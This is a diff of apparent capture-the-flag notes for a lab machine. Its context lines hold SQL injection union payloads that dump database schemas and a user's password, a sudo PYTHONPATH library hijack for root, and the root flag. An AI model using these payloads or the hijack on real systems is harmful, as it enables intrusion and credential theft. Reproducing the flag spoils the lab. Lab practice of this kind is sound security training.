@@ -102,7 +102,6 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds
 
-
 http://10.10.232.50:8000/
 
 login page
@@ -249,7 +248,6 @@ username='+union+select+1,(select+group_concat(schema_name,"\r\n")+from+informat
 Hi information_schema
 ,website
 
-
 username='+union+select+1,(select+group_concat(table_name,":",column_name,"\r\n")+from+information_schema.columns+where+table_schema='website'),3,4--+&password=witty
 Hi users:id
 ,users:username
@@ -258,7 +256,6 @@ Hi users:id
 
 username='+union+select+1,(select+group_concat(username,":",password,"\r\n")+from+website.users),3,4--+&password=witty
 Hi smokey:My_P@ssW0rd123
-
 
 now sqlmap (step by step)
 
@@ -552,11 +549,9 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-91-generic x86_64)
   Memory usage: 62%               IPv4 address for eth0: 10.10.232.50
   Swap usage:   0%
 
-
 8 updates can be applied immediately.
 8 of these updates are standard security updates.
 To see these additional updates run: apt list --upgradable
-
 
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
@@ -606,7 +601,6 @@ def hashing(passw):
     print("Your SHA1 hash is: ", end ="")
     print(sha1.hexdigest())
 
-
 def main():
     passw = input("Enter a password to hash: ")
     hashing(passw)
@@ -637,14 +631,7 @@ hazel@biblioteca:/tmp$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher
 root@biblioteca:/tmp# cat /root/root.txt
 THM{PytH0n_LiBr@RY_H1j@acKIn6}
 
-
-
 ```
-
-
-![[Pasted image 20230110175516.png]]
-
-![[Pasted image 20230110175810.png]]
 
 What is the user flag?  
 
